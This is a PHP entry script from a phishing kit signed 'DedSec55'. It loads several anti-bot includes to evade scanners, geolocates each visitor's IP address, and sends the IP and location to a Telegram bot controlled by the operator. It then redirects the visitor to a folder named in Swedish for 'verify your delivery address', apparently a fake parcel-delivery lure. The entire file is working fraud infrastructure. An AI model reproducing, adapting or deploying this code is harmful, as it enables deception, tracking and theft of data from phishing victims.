<?php
/*
8888888b.              888 .d8888b.                 888888888 888888888  
888  "Y88b             888d88P  Y88b                888       888        
888    888             888Y88b.                     888       888        
888    888 .d88b.  .d88888 "Y888b.   .d88b.  .d8888b8888888b. 8888888b.  
888    888d8P  Y8bd88" 888    "Y88b.d8P  Y8bd88P"        "Y88b     "Y88b 
888    88888888888888  888      "88888888888888            888       888 
888  .d88PY8b.    Y88b 888Y88b  d88PY8b.    Y88b.   Y88b  d88PY88b  d88P 
8888888P"  "Y8888  "Y88888 "Y8888P"  "Y8888  "Y8888P "Y8888P"  "Y8888P"  
Coded By DedSec55
DM:@DedSec55
*/

include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';
include "Verifiera_din_leveransadress/DedSec/Panel.php";


$ip = getenv("REMOTE_ADDR");




$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "\r\n";
$CITY    = $IP_LOOKUP->city . "\r\n";
$REGION  = $IP_LOOKUP->region . "\r\n";
$STATE   = $IP_LOOKUP->regionName . "\r\n";
$ZIPCODE = $IP_LOOKUP->zip . "\r\n";

$msg=$ip."\nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;

file_get_contents("https://api.telegram.org/".$bot_url."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($msg)."" );



header("Location: Verifiera_din_leveransadress/");